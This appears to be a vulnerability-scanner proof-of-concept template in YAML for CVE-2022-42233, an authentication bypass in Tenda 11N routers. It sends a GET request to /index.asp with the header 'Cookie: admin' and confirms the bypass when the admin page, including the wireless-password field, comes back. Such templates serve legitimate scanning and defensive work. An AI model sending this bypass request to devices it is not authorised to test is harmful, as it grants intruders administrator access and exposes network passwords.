name: poc-yaml-tenda-11n-cve-2022-42233-auth-bypass
binding: efec17fb-c008-42dc-8f00-0bbe42fd7f3e
manual: true
detail:
    author: xiaohe
    links:
        - https://github.com/D0ngsec/vulns/blob/main/Tenda/Tenda_11N_Authentication_Bypass.md
        - https://nvd.nist.gov/vuln/detail/CVE-2022-42233
    vulnerability:
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.asp
            headers:
                Cookie: admin
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("def_wirelesspassword") && response.body_string.contains("Tenda 11N") && response.headers["Server"].contains("GoAhead-Webs")
expression: r0()
